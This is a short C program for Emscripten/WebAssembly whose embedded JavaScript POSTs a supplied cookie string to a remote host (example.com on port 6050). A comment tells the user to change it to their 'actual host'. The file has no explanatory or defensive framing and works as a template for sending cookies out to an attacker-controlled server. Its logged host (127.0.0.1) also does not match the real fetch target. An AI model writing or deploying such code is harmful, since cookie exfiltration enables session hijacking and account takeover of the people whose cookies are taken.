#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <emscripten.h>

#define HOST "127.0.0.1" // Change to your actual host
#define PORT 6050

// Declare an external JavaScript function
EM_JS(void, send_to_js, (const char *cookie), {
    fetch("http://example.com:6050", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "cookie=" + UTF8ToString(cookie)
    }).then(response => response.text())
      .then(text => console.log("Server Response:", text))
      .catch(error => console.error("Error:", error));
});

EMSCRIPTEN_KEEPALIVE
void send_cookie(const char *cookie) {
    if (!cookie) {
        printf("No cookie provided.\n");
        return;
    }
    
    printf("Sending cookie to %s:%d -> %s\n", HOST, PORT, cookie);
    send_to_js(cookie);
}

int main() {
    char cookie[256];
    printf("Enter cookie: ");
    fgets(cookie, sizeof(cookie), stdin);
    cookie[strcspn(cookie, "\n")] = 0; // Remove newline character
    
    send_cookie(cookie);
    return 0;
}